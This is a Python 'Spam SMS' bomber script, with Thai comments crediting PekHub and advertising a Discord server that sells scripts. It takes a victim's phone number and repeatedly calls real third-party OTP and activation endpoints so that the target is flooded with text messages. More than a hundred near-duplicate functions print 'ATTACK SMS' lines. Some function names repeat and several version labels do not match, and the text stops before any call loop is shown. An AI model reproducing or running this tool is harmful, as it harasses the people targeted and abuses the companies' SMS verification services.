import requests,sys,os,time,threading
from threading import Thread
#################################
#เครดิต PekHub
#Discord : https://discord.gg/RC4KEDakbd
#ติดต่อซื้อสคริปต์,เปิดบอททักมา 𝕯𝖎𝖘𝖈𝖔𝖗𝖉.𝖏𝖘#1592 หรือ เข้าดิสมาถามได้
#################################

os.system("clear")
time.sleep(1)
print("[+] กำลังอัพเดตโมดุล...\n++++++++++++++++++++")
time.sleep(3)
os.system("pip install requests")
os.system("pip install colorama")
os.system("clear")
print(f''' \033[1;92m

    ██▓███  ▓█████  ██ ▄█▀ ██░ ██  █    ██  ▄▄▄▄   
   ▓██░  ██▒▓█   ▀  ██▄█▒ ▓██░ ██▒ ██  ▓██▒▓█████▄ 
   ▓██░ ██▓▒▒███   ▓███▄░ ▒██▀▀██░▓██  ▒██░▒██▒ ▄██
   ▒██▄█▓▒ ▒▒▓█  ▄ ▓██ █▄ ░▓█ ░██ ▓▓█  ░██░▒██░█▀  
   ▒██▒ ░  ░░▒████▒▒██▒ █▄░▓█▒░██▓▒▒█████▓ ░▓█  ▀█▓
   ▒▓▒░ ░  ░░░ ▒░ ░▒ ▒▒ ▓▒ ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░▒▓███▀▒
   ░▒ ░      ░ ░  ░░ ░▒ ▒░ ▒ ░▒░ ░░░▒░ ░ ░ ▒░▒   ░ 
   ░░          ░   ░ ░░ ░  ░  ░░ ░ ░░░ ░ ░  ░    ░ 
               ░  ░░  ░    ░  ░  ░   ░      ░      
                                                 ░ \033[0m''')
print("       [×] Script  : Spam SMS \n       [×] Credit  : 𝕯𝖎𝖘𝖈𝖔𝖗𝖉.𝖏𝖘#1592 \n       [×] Discord : https://discord.gg/RC4KEDakbd \n\n")

phone = input("\033[90m> \033[1;91m[+] | Number : \033[1;92m")
num = int(input("\033[90m> \033[1;91m[+] | Amount : \033[1;92m"))
os.system("clear")

def V1(): 
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v1] | Amount > [{i}/{num}]")
	
def V2():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v2] | Amount > [{i}/{num}]")
	
def V3():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v3] | Amount > [{i}/{num}]")
	
def V4():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v4] | Amount > [{i}/{num}]")
	
def V5():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v5] | Amount > [{i}/{num}]")
	
def V6():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v6] | Amount > [{i}/{num}]")
	
def V7():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v7] | Amount > [{i}/{num}]")
	
def V8():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v8] | Amount > [{i}/{num}]")

def V9():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v9] | Amount > [{i}/{num}]")
	
def V10():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v10] | Amount > [{i}/{num}]")

def V11():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v11] | Amount > [{i}/{num}]")

def V12():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v12] | Amount > [{i}/{num}]")
	
def V119():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v13] | Amount > [{i}/{num}]")
	
def V14():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v14] | Amount > [{i}/{num}]")

def V15():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v15] | Amount > [{i}/{num}]")

def V16():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v16] | Amount > [{i}/{num}]")

def V17():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v17] | Amount > [{i}/{num}]")

def V18():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v18] | Amount > [{i}/{num}]")

def V19():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v19] | Amount > [{i}/{num}]")
	
def V20():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v28] | Amount > [{i}/{num}]")

def V21():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v21] | Amount > [{i}/{num}]")
	
def V22():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v22] | Amount > [{i}/{num}]")
	
def V23():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v23] | Amount > [{i}/{num}]")

def V24():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v24] | Amount > [{i}/{num}]")

def V25():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v24] | Amount > [{i}/{num}]")
	
def V27():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v25] | Amount > [{i}/{num}]")
	
def V28():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v26] | Amount > [{i}/{num}]")
	
def V20():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v27] | Amount > [{i}/{num}]")

def V26():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v28] | Amount > [{i}/{num}]")
	
def V27():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v29] | Amount > [{i}/{num}]")

def V28():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v30] | Amount > [{i}/{num}]")

def V29():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v31] | Amount > [{i}/{num}]")

def V30():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v32] | Amount > [{i}/{num}]")

def V31():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v33] | Amount > [{i}/{num}]")

def V32():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v34] | Amount > [{i}/{num}]")
	
def V33():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v35] | Amount > [{i}/{num}]")

def V34():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v36] | Amount > [{i}/{num}]")
	
def V35():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v37] | Amount > [{i}/{num}]")

def V36():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v38] | Amount > [{i}/{num}]")

def V37():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v39] | Amount > [{i}/{num}]")

def V38():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v40] | Amount > [{i}/{num}]")
	
def V39():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v41] | Amount > [{i}/{num}]")

def V40():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v42] | Amount > [{i}/{num}]")

def V41():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v43] | Amount > [{i}/{num}]")

def V42():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v44] | Amount > [{i}/{num}]")

def V43():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v45] | Amount > [{i}/{num}]")
	
def V44():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v46] | Amount > [{i}/{num}]")
	
def V45():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v47] | Amount > [{i}/{num}]")
	
def V46():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v48] | Amount > [{i}/{num}]")
	
def V47():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v49] | Amount > [{i}/{num}]")
	
def V48():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v50] | Amount > [{i}/{num}]")
	
def V49():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v51] | Amount > [{i}/{num}]")
	
def V50():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v52] | Amount > [{i}/{num}]")
	
def V51():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v53] | Amount > [{i}/{num}]")
	
def V52():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v54] | Amount > [{i}/{num}]")
	
def V53():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v55] | Amount > [{i}/{num}]")

def V54():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v56] | Amount > [{i}/{num}]")

def V55():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v55] | Amount > [{i}/{num}]")

def V56():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v60] | Amount > [{i}/{num}]")
	
def V57():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v53] | Amount > [{i}/{num}]")
	
def V58():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v70] | Amount > [{i}/{num}]")

def V59():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v42] | Amount > [{i}/{num}]")

def V60():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v31] | Amount > [{i}/{num}]")

def V61():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v21] | Amount > [{i}/{num}]")

def V62():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v15] | Amount > [{i}/{num}]")
	
def V63():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v19] | Amount > [{i}/{num}]")

def V64():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v108] | Amount > [{i}/{num}]")

def V65():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v156] | Amount > [{i}/{num}]")

def V66():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v135] | Amount > [{i}/{num}]")

def V67():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v53] | Amount > [{i}/{num}]")

def V68():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v41] | Amount > [{i}/{num}]")

def V69():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v25] | Amount > [{i}/{num}]")

def V70():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v65] | Amount > [{i}/{num}]")

def V71():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v105] | Amount > [{i}/{num}]")

def V72():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v136] | Amount > [{i}/{num}]")
	
def V73():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v75] | Amount > [{i}/{num}]")

def V74():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v199] | Amount > [{i}/{num}]")

def V75():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v200] | Amount > [{i}/{num}]")

def V76():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v175] | Amount > [{i}/{num}]")

def V77():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [56] | Amount > [{i}/{num}]")
	
def V78():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v71] | Amount > [{i}/{num}]")

def V79():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v51] | Amount > [{i}/{num}]")

def V80():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v41] | Amount > [{i}/{num}]")

def V81():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v42] | Amount > [{i}/{num}]")

def V82():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v19] | Amount > [{i}/{num}]")

def V83():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v156] | Amount > [{i}/{num}]")

def V84():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v36] | Amount > [{i}/{num}]")

def V85():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v119] | Amount > [{i}/{num}]")

def V86():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v39] | Amount > [{i}/{num}]")

def V87():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v51] | Amount > [{i}/{num}]")

def V88():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v61] | Amount > [{i}/{num}]")

def V89():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v62] | Amount > [{i}/{num}]")

def V90():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v69] | Amount > [{i}/{num}]")

def V91():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v68] | Amount > [{i}/{num}]")

def V92():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v70] | Amount > [{i}/{num}]")

def V93():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v78] | Amount > [{i}/{num}]")

def V94():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v73] | Amount > [{i}/{num}]")

def V95():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v75] | Amount > [{i}/{num}]")

def V96():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v76] | Amount > [{i}/{num}]")

def V97():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v87] | Amount > [{i}/{num}]")

def V98():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v88] | Amount > [{i}/{num}]")
	
def V99():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v84] | Amount > [{i}/{num}]")

def V100():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v56] | Amount > [{i}/{num}]")
	
def V101():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v32] | Amount > [{i}/{num}]")

def V102():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v75] | Amount > [{i}/{num}]")

def V103():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v56] | Amount > [{i}/{num}]")
	
def V104():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v41] | Amount > [{i}/{num}]")

def V105():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v21] | Amount > [{i}/{num}]")

def V106():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v95] | Amount > [{i}/{num}]")

def V107():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v65] | Amount > [{i}/{num}]")

def V108():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v80] | Amount > [{i}/{num}]")

def V109():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(f"\033[1;92m[+] \033[0mATTACK SMS | Target > [{phone}] | API > [v81] | Amount > [{i}/{num}]")

def V110():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
